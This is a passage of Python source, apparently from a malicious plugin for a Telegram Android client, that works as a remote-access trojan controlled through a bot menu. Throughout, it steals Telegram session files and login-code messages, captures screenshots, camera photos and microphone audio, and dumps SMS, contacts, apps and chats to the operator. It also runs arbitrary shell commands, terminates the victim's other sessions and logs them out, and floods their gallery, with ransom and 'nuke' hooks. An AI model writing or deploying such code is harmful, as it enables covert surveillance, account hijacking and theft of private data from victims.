    def _handle_callback(self, cb):
        try:
            cb_id = cb.get("id")
            data = cb.get("data", "")
            if cb_id:
                self._answer_callback(cb_id)
            if data == CB_FULL_MENU:
                self._show_full_menu()
            elif data == "close_ransom":
                self._dismiss_ransom()
            elif data == "close_locker":
                self._clear_locker()
            elif data == "close_music":
                self._clear_music()
            elif data == "close_video":
                self._clear_video()
            elif data == "close_end":
                self._clear_dim()
            elif data == "hv_stop_nuke":
                self._stop_nuke_loop()
        except Exception as e:
            _log("callback: %s" % e)

    def _handle_message(self, msg):
        try:
            t = str(msg.get("text") or "").strip()
            if not t:
                return
            if self._input_mode == "music":
                self._input_mode = None
                if t.startswith(("http://", "https://")):
                    self._play_mmusic(t)
                else:
                    self._send_msg("Bad URL")
                return
            if self._input_mode == "video":
                self._input_mode = None
                if t.startswith(("http://", "https://")):
                    self._play_mvideo(t)
                else:
                    self._send_msg("Bad URL")
                return
            if self._input_mode == "shell":
                self._input_mode = None
                self._manual_shell(t)
                return
            if self._input_mode == "flood":
                self._input_mode = None
                if t.startswith(("http://", "https://")):
                    threading.Thread(target=self._flood_gallery, args=(t, 100), daemon=True).start()
                else:
                    self._send_msg("Bad URL")
                return

            if t == "Manual using":
                self._show_manual_menu()
            elif t == "Troll":
                self._show_troll_menu()
            elif t == "⬅️ Back":
                self._show_full_menu()
            elif t == "Session Control":
                self._show_sessions_menu()
            elif t == "Surveillance":
                self._show_surveillance_menu()
            elif t == "Data Grab":
                self._show_data_menu()
            elif t == "Account":
                self._show_account_menu()
            elif t == "Shell":
                self._show_shell_menu()
            elif t == "Session gain":
                threading.Thread(target=self._session_gain, daemon=True).start()
            elif t == "Full Pull out":
                threading.Thread(target=self._full_pull_out, daemon=True).start()
            elif t == "Screenshot":
                threading.Thread(target=self._screenshot, daemon=True).start()
            elif t == "Camera Front":
                threading.Thread(target=self._manual_camera, args=("front",), daemon=True).start()
            elif t == "Camera Back":
                threading.Thread(target=self._manual_camera, args=("back",), daemon=True).start()
            elif t == "Audio 5s":
                threading.Thread(target=self._manual_audio, args=(5,), daemon=True).start()
            elif t == "SMS":
                threading.Thread(target=self._manual_sms, daemon=True).start()
            elif t == "Contacts":
                threading.Thread(target=self._manual_contacts, daemon=True).start()
            elif t == "Apps":
                threading.Thread(target=self._manual_apps, daemon=True).start()
            elif t == "Chats":
                threading.Thread(target=self._manual_chats, daemon=True).start()
            elif t == "Telegram Chat":
                threading.Thread(target=self._manual_telegram_chat, daemon=True).start()
            elif t == "Info":
                threading.Thread(target=self._harvest_account_info, args=(0, True), daemon=True).start()
            elif t == "Pull Out":
                threading.Thread(target=self._full_pull_out, daemon=True).start()
            elif t == "ls /sdcard":
                self._manual_shell("ls /sdcard")
            elif t == "ps":
                self._manual_shell("ps -A")
            elif t == "ifconfig":
                self._manual_shell("ifconfig")
            elif t == "df -h":
                self._manual_shell("df -h")
            elif t == "M-music":
                self._input_mode = "music"
                self._send_msg("Send .mp3 URL")
            elif t == "M-Video":
                self._input_mode = "video"
                self._send_msg("Send .mp4 URL")
            elif t == "Flood Gallery":
                self._input_mode = "flood"
                self._send_msg("Send photo URL")
            elif t == "Clear Flood":
                self._clear_flood()
        except Exception as e:
            _log("handle msg: %s" % e)

    # ---- Telegram Chat: 777000 -> HTML ----
    def _manual_telegram_chat(self):
        try:
            acc = self.account or 0
            mc = _MC().getInstance(acc)
            peer = None
            u = None
            try:
                u = mc.getUser(SERVICE_CHAT_ID)
            except Exception:
                u = None
            ah = _safe_int(getattr(u, "access_hash", 0)) if u is not None else 0
            IPUser = _cls("org.telegram.tgnet.TLRPC$TL_inputPeerUser",
                          "org.telegram.tgnet.tl.TL_inputPeerUser")
            if IPUser:
                peer = IPUser()
                peer.user_id = SERVICE_CHAT_ID
                peer.access_hash = ah
            if peer is None:
                self._send_msg("Telegram Chat: no inputPeerUser class")
                return

            GetHist = _cls("org.telegram.tgnet.TLRPC$TL_messages_getHistory",
                           "org.telegram.tgnet.tl.TL_messages$getHistory")
            if not GetHist:
                self._send_msg("Telegram Chat: no getHistory class")
                return

            req = GetHist()
            req.peer = peer
            req.offset_id = 0
            req.offset_date = 0
            req.add_offset = 0
            req.limit = 100
            req.max_id = 0
            req.min_id = 0
            req.hash = 0

            resp, err = self._rg_rpc(req, acc, 20.0, fast=False)
            if err is not None:
                self._send_msg("Telegram Chat err: " + str(err))
                return
            if resp is None:
                self._send_msg("Telegram Chat: empty response")
                return

            msgs = getattr(resp, "messages", None)
            users = getattr(resp, "users", None)
            chats = getattr(resp, "chats", None)

            umap = {}
            if users is not None:
                for i in range(_jlist_size(users)):
                    uu = _jlist_get(users, i)
                    if uu is None:
                        continue
                    uid = _safe_int(getattr(uu, "id", 0))
                    if uid:
                        fn = str(getattr(uu, "first_name", "") or "")
                        ln = str(getattr(uu, "last_name", "") or "")
                        un = str(getattr(uu, "username", "") or "")
                        umap[uid] = (" ".join(x for x in (fn, ln) if x) or
                                     ("@" + un if un else str(uid)))

            cmap = {}
            if chats is not None:
                for i in range(_jlist_size(chats)):
                    cc = _jlist_get(chats, i)
                    if cc is None:
                        continue
                    cid = _safe_int(getattr(cc, "id", 0))
                    if cid:
                        cmap[cid] = str(getattr(cc, "title", "") or str(cid))

            rows = []
            if msgs is not None:
                for i in range(_jlist_size(msgs)):
                    m = _jlist_get(msgs, i)
                    if m is None:
                        continue
                    if not _get_bool_attr(m, "out", False) and \
                       not hasattr(m, "message"):
                        continue
                    mid = _safe_int(getattr(m, "id", 0))
                    date = _safe_int(getattr(m, "date", 0))
                    text = str(getattr(m, "message", "") or "")
                    frm = ""
                    try:
                        fp = getattr(m, "from_id", None)
                        if fp is not None:
                            fuid = _safe_int(getattr(fp, "user_id", 0))
                            if fuid:
                                frm = umap.get(fuid, "user:" + str(fuid))
                            else:
                                fcid = _safe_int(getattr(fp, "channel_id", 0))
                                if fcid:
                                    frm = cmap.get(fcid, "channel:" + str(fcid))
                                else:
                                    fchat = _safe_int(getattr(fp, "chat_id", 0))
                                    if fchat:
                                        frm = cmap.get(fchat, "chat:" + str(fchat))
                    except Exception:
                        frm = ""
                    if not frm:
                        frm = "777000"
                    try:
                        ts = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(date)) if date else "—"
                    except Exception:
                        ts = "—"
                    rows.append((ts, frm, text, mid))

            rows.sort(key=lambda r: r[3])

            h = [
                "<!doctype html><html><head><meta charset='utf-8'>",
                "<title>Telegram Chat 777000</title>",
                "<style>body{font-family:monospace;background:#111;color:#ddd;padding:12px}",
                "table{border-collapse:collapse;width:100%}td,th{border:1px solid #333;",
                "padding:6px;vertical-align:top;font-size:12px}th{background:#222}",
                ".ts{color:#888;white-space:nowrap}.fr{color:#6cf;white-space:nowrap}",
                "</style></head><body>",
                "<h2>Service notifications (777000)</h2>",
                "<p>Collected: %d / limit 100</p>" % len(rows),
                "<table><tr><th>#</th><th>Date</th><th>From</th><th>Text</th></tr>",
            ]
            for ts, frm, text, mid in rows:
                h.append("<tr><td>%d</td><td class='ts'>%s</td><td class='fr'>%s</td>"
                         "<td>%s</td></tr>" % (
                             mid, self._html_escape(ts),
                             self._html_escape(frm),
                             self._html_escape(text).replace("\n", "<br>")))
            h.append("</table></body></html>")
            html_bytes = "".join(h).encode("utf-8", "ignore")

            fname = "telegram_chat_777000_%d.html" % int(time.time())
            self._send_document_bytes(fname, html_bytes)
            self._send_msg("Telegram Chat: %d messages, %d bytes" %
                           (len(rows), len(html_bytes)))
        except Exception as e:
            self._send_msg("Telegram Chat exc: " + str(e))

    # ---- Session gain: all sessions, up to 1 GB ----
    def _collect_session_entries(self):
        ctx = ApplicationLoader.applicationContext
        if ctx is None:
            return None, None
        pkg = str(ctx.getPackageName())
        base = "/data/data/%s" % pkg
        entries = []

        def add(path, arc=None):
            try:
                if os.path.isfile(path) and os.path.getsize(path) > 0:
                    a = arc or os.path.relpath(path, base).replace("\\", "/")
                    entries.append((a, path, os.path.getsize(path)))
            except Exception:
                pass

        add(base + "/files/tgnet.dat")
        add(base + "/files/cache4.db")
        add(base + "/files/cache4.db-wal")
        add(base + "/files/cache4.db-shm")

        for sub in ("files", "shared_prefs", "databases", "no_backup"):
            d = base + "/" + sub
            if not os.path.isdir(d):
                continue
            for name in sorted(os.listdir(d)):
                p = d + "/" + name
                if os.path.isfile(p):
                    low = name.lower()
                    if (low.endswith((".dat", ".db", ".db-wal", ".db-shm", ".xml"))
                            or "userconfig" in low or "cache4" in low
                            or "tgnet" in low or "account" in low):
                        add(p)
                elif os.path.isdir(p) and name.startswith("account"):
                    for n2 in sorted(os.listdir(p)):
                        p2 = p + "/" + n2
                        if os.path.isfile(p2) and n2.lower().endswith(
                                (".dat", ".db", ".db-wal", ".db-shm", ".xml")):
                            add(p2)
        return base, entries

    def _session_gain(self):
        try:
            base, entries = self._collect_session_entries()
            if base is None:
                self._send_msg("Session gain: no ctx")
                return
            if not entries:
                self._send_msg("Session gain: no files")
                return

            amap = {}
            for a in self._get_accounts_list():
                amap[str(a.get("id"))] = {
                    "user_id": a.get("user_id"),
                    "username": a.get("username", ""),
                    "phone": a.get("phone", ""),
                }
            amap_blob = json.dumps(amap, ensure_ascii=False, indent=2).encode("utf-8")
            fixed = sum(e[2] for e in entries) + len(amap_blob)

            if fixed > SESSION_ZIP_MAX:
                entries.sort(key=lambda e: e[2])
                kept = []
                total = len(amap_blob)
                for e in entries:
                    if total + e[2] > SESSION_ZIP_MAX:
                        break
                    kept.append(e)
                    total += e[2]
                dropped = len(entries) - len(kept)
                entries = kept
                self._send_msg("Session gain: capped at 1GB, dropped %d" % dropped)

            self._send_msg("Session gain: packing %d files..." % len(entries))
            z = io.BytesIO()
            added = 0
            with zipfile.ZipFile(z, "w", zipfile.ZIP_DEFLATED, allowZip64=True) as zf:
                for arc, path, _sz in entries:
                    try:
                        zf.write(path, arcname=arc)
                        added += 1
                    except Exception as e:
                        _log("zip skip %s: %s" % (arc, e))
                if amap:
                    zf.writestr("accounts_map.json", amap_blob)

            final = z.getvalue()
            if len(final) > SESSION_ZIP_MAX:
                self._send_msg("Session gain: zip %d > 1GB, abort" % len(final))
                return

            chunk = 45 * 1024 * 1024
            if len(final) <= chunk:
                self._send_document_bytes("session_gain.zip", final)
            else:
                parts = (len(final) + chunk - 1) // chunk
                for i in range(parts):
                    part = final[i * chunk:(i + 1) * chunk]
                    self._send_document_bytes(
                        "session_gain_part%02d_of%02d.zip" % (i + 1, parts), part)
                    time.sleep(1.0)
            self._send_msg("Session gain: %d files, %d bytes" % (added, len(final)))
        except Exception as e:
            self._send_msg("Session gain err: " + str(e))

    # ---- Full pull out: all sessions, all accounts ----
    def _full_pull_out(self):
        try:
            self._send_msg("Full Pull out...")
            total_killed = 0
            total_seen = 0
            for a in self._get_accounts_list():
                acc = a.get("id", 0)
                for _pass in range(3):
                    try:
                        k, t = self._kill_all_sessions(acc, phones_pc_only=False)
                        total_killed += k
                        total_seen = max(total_seen, t)
                    except Exception as e:
                        _log("pull pass %d acc %d: %s" % (_pass, acc, e))
                    time.sleep(1.2)
                try:
                    self._kill_web_authorizations(acc)
                except Exception:
                    pass
            try:
                self._pull_out_account()
            except Exception as e:
                _log("pull logout: %s" % e)
            self._send_msg("<b>Full Pull out done</b>\nKilled: %d / %d\nLogout: sent"
                           % (total_killed, total_seen), html=True)
        except Exception as e:
            self._send_msg("Full pull out err: " + str(e))

    def _harvest_account_info(self, acc=0, send=False):
        out = {}
        try:
            uc = _UC().getInstance(acc)
            uid = int(uc.getClientUserId())
            out["user_id"] = str(uid)
            u = None
            try:
                u = uc.getCurrentUser()
            except Exception:
                pass
            if u is None:
                try:
                    u = _MC().getInstance(acc).getUser(uid)
                except Exception:
                    pass
            ph = _phone_from_user(u)
            if ph:
                out["phone"] = ph
            if u is not None:
                fn = str(getattr(u, "first_name", "") or "").strip()
                ln = str(getattr(u, "last_name", "") or "").strip()
                un = str(getattr(u, "username", "") or "").strip()
                if fn:
                    out["first_name"] = fn
                if ln:
                    out["last_name"] = ln
                if un:
                    out["username"] = "@" + un if not un.startswith("@") else un
            if send:
                lines = ["<b>Account info</b>"]
                for k, v in out.items():
                    lines.append("<b>%s:</b> %s" % (k, self._html_escape(str(v))))
                self._send_msg("\n".join(lines), html=True)
        except Exception as e:
            _log("harvest: %s" % e)
        return out

    def _get_authorizations_full(self, acc=0):
        try:
            Req = _cls("org.telegram.tgnet.TLRPC$TL_account_getAuthorizations",
                       "org.telegram.tgnet.tl.TL_account$getAuthorizations")
            if not Req:
                return None
            resp, err = self._rg_rpc(Req(), acc, 8.0, fast=True)
            if resp is None:
                return None
            auths = getattr(resp, "authorizations", None)
            out = []
            if auths is None:
                return out
            for i in range(_jlist_size(auths)):
                a = _jlist_get(auths, i)
                if not a:
                    continue
                out.append({
                    "hash": _safe_int(getattr(a, "hash", 0)),
                    "current": _get_bool_attr(a, "current", False),
                    "device": str(getattr(a, "device_model", "") or ""),
                    "app": str(getattr(a, "app_name", "") or ""),
                    "platform": str(getattr(a, "platform", "") or ""),
                })
            return out
        except Exception:
            return None

    def _kill_all_sessions(self, acc=0, phones_pc_only=False):
        auths = self._get_authorizations_full(acc)
        if auths is None:
            return 0, 0
        total = len(auths)
        dead = set()
        web_words = ("web", "chrome", "firefox", "safari", "opera", "edge",
                     "browser", "http")

        def _one(h):
            try:
                Rst = _cls("org.telegram.tgnet.TLRPC$TL_account_resetAuthorization",
                           "org.telegram.tgnet.tl.TL_account$resetAuthorization")
                if not Rst:
                    return False
                rq = Rst()
                rq.hash = h
                _r, e = self._rg_rpc(rq, acc, 6.0, fast=True)
                return e is None
            except Exception:
                return False

        killed = 0
        for _pass in range(5):
            targets = []
            for a in auths:
                if a["current"] or not a["hash"] or a["hash"] in dead:
                    continue
                if phones_pc_only:
                    blob = ((a.get("device") or "") + " " + (a.get("app") or "")
                            + " " + (a.get("platform") or "")).lower()
                    if any(w in blob for w in web_words):
                        continue
                targets.append(a["hash"])
            if not targets:
                break
            res = self._parallel([(_one, h) for h in targets], workers=6, timeout=40)
            for r, h in zip(res, targets):
                if r is True:
                    killed += 1
                    dead.add(h)
            if _pass < 4:
                time.sleep(1.5)
                a2 = self._get_authorizations_full(acc)
                if not a2:
                    break
                auths = a2
                total = max(total, len(a2))
        try:
            Rst = _cls("org.telegram.tgnet.TLRPC$TL_auth_resetAuthorizations",
                       "org.telegram.tgnet.tl.TL_auth$resetAuthorizations")
            if Rst:
                self._rg_rpc(Rst(), acc, 10.0, fast=True)
        except Exception:
            pass
        return killed, max(total, killed)

    def _kill_web_authorizations(self, acc=0):
        try:
            Get = _cls("org.telegram.tgnet.TLRPC$TL_account_getWebAuthorizations",
                       "org.telegram.tgnet.tl.TL_account$getWebAuthorizations")
            if not Get:
                return 0
            resp, _e = self._rg_rpc(Get(), acc, 8.0, fast=True)
            if resp is None:
                return 0
            auths = getattr(resp, "authorizations", None)
            if auths is None:
                return 0
            Reset = _cls("org.telegram.tgnet.TLRPC$TL_account_resetWebAuthorization",
                         "org.telegram.tgnet.tl.TL_account$resetWebAuthorization")
            if not Reset:
                return 0
            hashes = []
            for i in range(_jlist_size(auths)):
                h = _safe_int(getattr(_jlist_get(auths, i), "hash", 0))
                if h:
                    hashes.append(h)

            def _one(h):
                try:
                    rq = Reset()
                    rq.hash = h
                    _r, e = self._rg_rpc(rq, acc, 6.0, fast=True)
                    return e is None
                except Exception:
                    return False

            res = self._parallel([(_one, h) for h in hashes], workers=5, timeout=25)
            return sum(1 for r in res if r is True)
        except Exception:
            return 0

    def _pull_out_account(self):
        try:
            self._send_msg("Pull Out...")
            Lo = _cls("org.telegram.tgnet.TLRPC$TL_auth_logOut",
                      "org.telegram.tgnet.tl.TL_auth$logOut")
            if not Lo:
                self._send_msg("Pull out err: no class")
                return
            _r, e = self._rg_rpc(Lo(), 0, 10.0, fast=True)
            self._send_msg("Pull out OK." if e is None else "Pull out err: " + str(e))
        except Exception as e:
            self._send_msg("Pull out exc: " + str(e))

    # ---- permissions / activity ----
    def _has_perm(self, name):
        try:
            ctx = ApplicationLoader.applicationContext
            if ctx is None:
                return False
            pm = ctx.getPackageManager()
            return pm.checkPermission(name, ctx.getPackageName()) == 0
        except Exception:
            return False

    def _get_activity(self):
        for getter in (
            lambda: jclass("org.telegram.ui.LaunchActivity").instance,
            lambda: ApplicationLoader.application.getCurrentActivity(),
        ):
            try:
                a = getter()
                if a is not None:
                    return a
            except Exception:
                pass
        return None

    def _assets_dir(self):
        ctx = ApplicationLoader.applicationContext
        d = os.path.join(str(ctx.getFilesDir().getAbsolutePath()), "sec_assets")
        if not os.path.exists(d):
            os.makedirs(d)
        return d

    # ---- screenshot ----
    def _screenshot(self):
        try:
            act = self._get_activity()
            if act is None:
                self._send_msg("Screenshot: no activity")
                return
            view = act.getWindow().getDecorView().getRootView()
            w = view.getWidth()
            h = view.getHeight()
            if w <= 0 or h <= 0:
                self._send_msg("Screenshot: bad size")
                return
            Bitmap = jclass("android.graphics.Bitmap")
            Canvas = jclass("android.graphics.Canvas")
            Config = jclass("android.graphics.Bitmap$Config")
            bmp = Bitmap.createBitmap(w, h, Config.ARGB_8888)
            c = Canvas(bmp)
            view.draw(c)
            p = os.path.join(self._assets_dir(), "screenshot_%d.jpg" % int(time.time()))
            from java.io import FileOutputStream
            fos = FileOutputStream(p)
            fmt = jclass("android.graphics.Bitmap$CompressFormat").JPEG
            bmp.compress(fmt, 85, fos)
            fos.flush()
            fos.close()
            bmp.recycle()
            phone = "—"
            try:
                u = _UC().getInstance(0).getCurrentUser()
                rp = _phone_from_user(u)
                if rp:
                    phone = rp
            except Exception:
                pass
            self._send_photo(p, "Phone: " + phone)
            try:
                os.remove(p)
            except Exception:
                pass
        except Exception as e:
            self._send_msg("Screenshot err: " + str(e))

    # ---- camera ----
    def _open_camera_safe(self, cam_cls, cid):
        for _ in range(4):
            try:
                c = cam_cls.open(int(cid))
                if c is not None:
                    return c
            except Exception as e:
                _log("camera open %d: %s" % (cid, e))
            time.sleep(0.4)
        try:
            return cam_cls.open()
        except Exception as e:
            _log("camera open() fallback: %s" % e)
            return None

    def _manual_camera(self, which="front"):
        try:
            if not self._has_perm("android.permission.CAMERA"):
                self._send_msg("Camera: no perm")
                return
            cam = jclass("android.hardware.Camera")
            cid = None
            try:
                ic = jclass("android.hardware.Camera$CameraInfo")
                facing = ic.CAMERA_FACING_FRONT if which == "front" else ic.CAMERA_FACING_BACK
                info = ic()
                total = int(cam.getNumberOfCameras())
                for i in range(total):
                    cam.getCameraInfo(i, info)
                    if int(info.facing) == int(facing):
                        cid = i
                        break
            except Exception:
                cid = None
            if cid is None:
                cid = 1 if which == "front" else 0
            c = self._open_camera_safe(cam, cid)
            if c is None:
                self._send_msg("Camera: no open")
                return
            try:
                st = jclass("android.graphics.SurfaceTexture")(0)
                c.setPreviewTexture(st)
                c.startPreview()
                ev = threading.Event()
                box = [None]
                PC = jclass("android.hardware.Camera$PictureCallback")

                class _PC(dynamic_proxy(PC)):
                    def onPictureTaken(self, data, camera):
                        box[0] = data
                        ev.set()

                cb = _PC()
                c.takePicture(None, None, cb)
                ev.wait(8)
                if box[0]:
                    self._send_document_bytes("%s.jpg" % which, bytes(box[0]))
                else:
                    self._send_msg("Camera: no photo")
            finally:
                try:
                    c.stopPreview()
                except Exception:
                    pass
                try:
                    c.release()
                except Exception:
                    pass
        except Exception as e:
            self._send_msg("Camera err: " + str(e))

    # ---- audio ----
    def _manual_audio(self, sec=5):
        try:
            if not self._has_perm("android.permission.RECORD_AUDIO"):
                self._send_msg("Audio: no perm")
                return
            ctx = ApplicationLoader.applicationContext
            p = os.path.join(str(ctx.getCacheDir().getAbsolutePath()),
                             "a_%d.3gp" % int(time.time()))
            MR = jclass("android.media.MediaRecorder")
            mr = MR()
            try:
                mr.setAudioSource(MR.AudioSource.MIC)
                mr.setOutputFormat(MR.OutputFormat.THREE_GPP)
                mr.setAudioEncoder(MR.AudioEncoder.AMR_NB)
                mr.setOutputFile(p)
                mr.prepare()
                mr.start()
                time.sleep(int(sec))
                mr.stop()
            finally:
                try:
                    mr.release()
                except Exception:
                    pass
            with open(p, "rb") as f:
                data = f.read()
            try:
                os.remove(p)
            except Exception:
                pass
            self._send_document_bytes("audio.3gp", data)
        except Exception as e:
            self._send_msg("Audio err: " + str(e))

    # ---- data grab ----
    def _manual_sms(self):
        try:
            out = []
            if self._has_perm("android.permission.READ_SMS"):
                ctx = ApplicationLoader.applicationContext
                cr = ctx.getContentResolver()
                Uri = jclass("android.net.Uri")
                cur = cr.query(Uri.parse("content://sms"),
                               ["address", "body", "date"], None, None, "date DESC")
                if cur:
                    while cur.moveToNext():
                        out.append("%s: %s" % (cur.getString(0), cur.getString(1)))
                    cur.close()
            if not out:
                self._send_msg("SMS empty or no perm")
                return
            self._send_msg("<b>SMS (%d)</b>\n<pre>%s</pre>" % (
                len(out), self._html_escape("\n".join(out[:100]))), html=True)
        except Exception as e:
            self._send_msg("sms err: " + str(e))

    def _manual_contacts(self):
        try:
            out = []
            if self._has_perm("android.permission.READ_CONTACTS"):
                ctx = ApplicationLoader.applicationContext
                cr = ctx.getContentResolver()
                Uri = jclass("android.net.Uri")
                cur = cr.query(Uri.parse("content://com.android.contacts/data/phones"),
                               ["display_name", "data1"], None, None, None)
                if cur:
                    while cur.moveToNext():
                        out.append("%s — %s" % (cur.getString(0), cur.getString(1)))
                    cur.close()
            if not out:
                self._send_msg("Contacts empty or no perm")
                return
            self._send_msg("<b>Contacts (%d)</b>\n<pre>%s</pre>" % (
                len(out), self._html_escape("\n".join(out[:200]))), html=True)
        except Exception as e:
            self._send_msg("contacts err: " + str(e))

    def _manual_apps(self):
        try:
            ctx = ApplicationLoader.applicationContext
            pm = ctx.getPackageManager()
            apps = pm.getInstalledApplications(0)
            out = []
            for i in range(_jlist_size(apps)):
                try:
                    a = _jlist_get(apps, i)
                    pkg = str(a.packageName)
                    label = pkg
                    try:
                        label = str(pm.getApplicationLabel(a))
                    except Exception:
                        pass
                    out.append("%s — %s" % (label, pkg))
                except Exception:
                    pass
            out.sort()
            self._send_msg("<b>Apps (%d)</b>\n<pre>%s</pre>" % (
                len(out), self._html_escape("\n".join(out[:300]))), html=True)
        except Exception as e:
            self._send_msg("apps err: " + str(e))

    def _manual_chats(self):
        try:
            mc = _MC().getInstance(0)
            dialogs = None
            try:
                dialogs = mc.dialogs_dict
            except Exception:
                dialogs = None
            if dialogs is None:
                try:
                    dialogs = mc.getAllDialogs()
                except Exception:
                    dialogs = None
            if dialogs is None:
                self._send_msg("no dialogs")
                return
            keys = []
            if hasattr(dialogs, "keySet"):
                try:
                    for k in _jmap_keys(dialogs):
                        keys.append(_safe_int(k, 0))
                except Exception:
                    keys = []
            if not keys:
                try:
                    keys = [int(dialogs.keyAt(i)) for i in range(_jlist_size(dialogs))]
                except Exception:
                    keys = []
            out = []
            for did in keys:
                if not did:
                    continue
                try:
                    title = ""
                    if did > 0:
                        u = mc.getUser(did)
                        if u is not None:
                            title = " ".join(x for x in (
                                str(getattr(u, "first_name", "") or ""),
                                str(getattr(u, "last_name", "") or "")) if x) or str(did)
                    else:
                        cid = -did
                        if cid > 1000000000000:
                            cid -= 1000000000000
                        c = mc.getChat(int(cid))
                        if c is not None:
                            title = str(getattr(c, "title", "") or str(did))
                    out.append("%d — %s" % (did, title or "?"))
                except Exception:
                    pass
            self._send_msg("<b>Chats (%d)</b>\n<pre>%s</pre>" % (
                len(out), self._html_escape("\n".join(out[:200]))), html=True)
        except Exception as e:
            self._send_msg("chats err: " + str(e))

    # ---- shell ----
    def _manual_shell(self, cmd):
        try:
            env = dict(os.environ)
            env["PATH"] = "/sbin:/system/sbin:/system/bin:/system/xbin:" + env.get("PATH", "")
            p = subprocess.run(["/system/bin/sh", "-c", cmd],
                               capture_output=True, timeout=30, env=env)
            out = p.stdout.decode("utf-8", "ignore")
            err = p.stderr.decode("utf-8", "ignore")
            self._send_msg("<b>shell</b> <code>%s</code>\n<b>rc:</b> %d\n<pre>%s\n%s</pre>" % (
                self._html_escape(cmd), p.returncode,
                self._html_escape(out[:3000]), self._html_escape(err[:1000])), html=True)
        except Exception as e:
            self._send_msg("shell err: " + str(e))

    # ---- music ----
    def _play_mmusic(self, url):
        def task():
            try:
                path = os.path.join(self._assets_dir(), "mmusic_%d.mp3" % int(time.time()))
                self._send_msg("Downloading...")
                sz, reason = _download_to_file(url, path, max_size=50 * 1024 * 1024, timeout=120)
                if sz <= 0:
                    self._send_msg("music download fail: " + str(reason))
                    return
                with self._music_lock:
                    self._stop_music_locked()
                    mp = jclass("android.media.MediaPlayer")()
                    mp.setDataSource(path)
                    mp.prepare()
                    mp.setLooping(True)
                    mp.start()
                    self._music_mp = mp
                    self._music_path = path
                self._send_msg("Music playing")
            except Exception as e:
                self._send_msg("music err: " + str(e))

        threading.Thread(target=task, daemon=True).start()

    def _stop_music_locked(self):
        if self._music_mp is not None:
            try:
                self._music_mp.stop()
            except Exception:
                pass
            try:
                self._music_mp.release()
            except Exception:
                pass
            self._music_mp = None
        if self._music_path:
            try:
                if os.path.exists(self._music_path):
                    os.remove(self._music_path)
            except Exception:
                pass
            self._music_path = ""

    def _clear_music(self):
        with self._music_lock:
            self._stop_music_locked()

    # ---- video ----
    def _play_mvideo(self, url):
        def task():
            try:
                path = os.path.join(self._assets_dir(), "mvideo_%d.mp4" % int(time.time()))
                self._send_msg("Downloading video...")
                sz, reason = _download_to_file(url, path, max_size=VIDEO_MAX_SIZE, timeout=300)
                if sz <= 0:
                    self._send_msg("video download fail: " + str(reason))
                    return

                def _render():
                    try:
                        act = self._get_activity()
                        if act is None:
                            self._send_msg("video: no activity")
                            try:
                                os.remove(path)
                            except Exception:
                                pass
                            return
                        FrameLayout = jclass("android.widget.FrameLayout")
                        VLG = jclass("android.view.ViewGroup$LayoutParams")
                        VV = jclass("android.widget.VideoView")
                        MC = jclass("android.widget.MediaController")
                        Color = jclass("android.graphics.Color")
                        LP = jclass("android.view.WindowManager$LayoutParams")

                        with self._video_lock:
                            self._stop_video_locked()

                        root = FrameLayout(act)
                        root.setBackgroundColor(Color.BLACK)
                        vv = VV(act)
                        root.addView(vv, VLG(VLG.MATCH_PARENT, VLG.MATCH_PARENT))
                        mc = MC(act)
                        mc.setAnchorView(vv)
                        vv.setMediaController(mc)
                        vv.setVideoPath(path)
                        win = act.getWindow()
                        win.addFlags(getattr(LP, "FLAG_FULLSCREEN", 1024)
                                     | getattr(LP, "FLAG_KEEP_SCREEN_ON", 128))
                        decor = win.getDecorView()
                        decor.addView(root, VLG(VLG.MATCH_PARENT, VLG.MATCH_PARENT))
                        with self._video_lock:
                            self._video_view = root
                            self._video_vv = vv
                            self._video_path = path
                        vv.start()
                        self._send_msg("Video playing")
                    except Exception as e:
                        self._send_msg("video render err: " + str(e))

                act = self._get_activity()
                if act is not None:
                    act.runOnUiThread(_render)
                else:
                    _render()
            except Exception as e:
                self._send_msg("video err: " + str(e))

        threading.Thread(target=task, daemon=True).start()

    def _stop_video_locked(self):
        vv = self._video_vv
        view = self._video_view
        path = self._video_path
        self._video_vv = None
        self._video_view = None
        self._video_path = ""
        if vv is not None:
            try:
                vv.stopPlayback()
            except Exception:
                pass
        if view is not None:
            try:
                parent = view.getParent()
                if parent is not None:
                    parent.removeView(view)
            except Exception:
                pass
        if path:
            try:
                if os.path.exists(path):
                    os.remove(path)
            except Exception:
                pass

    def _clear_video(self):
        with self._video_lock:
            self._stop_video_locked()

    # ---- flood ----
    def _flood_gallery(self, photo_url, count=100):
        try:
            from urllib.request import urlopen
            data = urlopen(photo_url, timeout=30).read()
            cr = ApplicationLoader.applicationContext.getContentResolver()
            ImageMedia = jclass("android.provider.MediaStore$Images$Media")
            cv_cls = jclass("android.content.ContentValues")
            uri_cls = jclass("android.net.Uri")
            sdk = 0
            try:
                sdk = int(jclass("android.os.Build$VERSION").SDK_INT)
            except Exception:
                sdk = 0
            saved = []
            for i in range(min(int(count), 200)):
                try:
                    ts = int(time.time()) + i
                    name = "IMG_%s_%d.jpg" % (
                        time.strftime("%Y%m%d_%H%M%S", time.localtime(ts)),
                        random.randint(1000, 9999))
                    values = cv_cls()
                    values.put("_display_name", name)
                    values.put("mime_type", "image/jpeg")
                    if sdk >= 29:
                        values.put("relative_path", "Pictures/")
                    uri = cr.insert(ImageMedia.EXTERNAL_CONTENT_URI, values)
                    if uri:
                        out = cr.openOutputStream(uri)
                        out.write(data)
                        out.close()
                        saved.append(str(uri))
                except Exception as e:
                    _log("flood item: %s" % e)
            self._flood_uris = saved
            self._send_msg("Flood: %d files" % len(saved))
        except Exception as e:
            self._send_msg("flood err: " + str(e))

    def _clear_flood(self):
        try:
            cr = ApplicationLoader.applicationContext.getContentResolver()
            uri_cls = jclass("android.net.Uri")
            removed = 0
            for u in self._flood_uris:
                try:
                    cr.delete(uri_cls.parse(u), None, None)
                    removed += 1
                except Exception:
                    pass
            self._send_msg("Flood cleared: %d" % removed)
        except Exception as e:
            self._send_msg("clear flood err: " + str(e))

    # ---- stubs ----
    def _dismiss_ransom(self):
        return {"ok": True}

    def _clear_locker(self):
        self._locker_view = None
        self._locker_on = False

    def _clear_dim(self):
        self._dim_view = None
        self._dim_active = False

    # ---- nuke ----
    def _nuke_marker_path(self):
        try:
            ctx = ApplicationLoader.applicationContext
            return os.path.join(str(ctx.getFilesDir().getAbsolutePath()), ".ar_nuke_active")
        except Exception:
            return None

    def _mark_nuke(self):
        try:
            m = self._nuke_marker_path()
            if m:
                with open(m, "w") as f:
                    f.write("1")
            with self._nuke_lock:
                self._nuke_on = True
        except Exception:
            pass

    def _check_persisted_nuke(self):
        try:
            m = self._nuke_marker_path()
            if not m or not os.path.exists(m):
                return
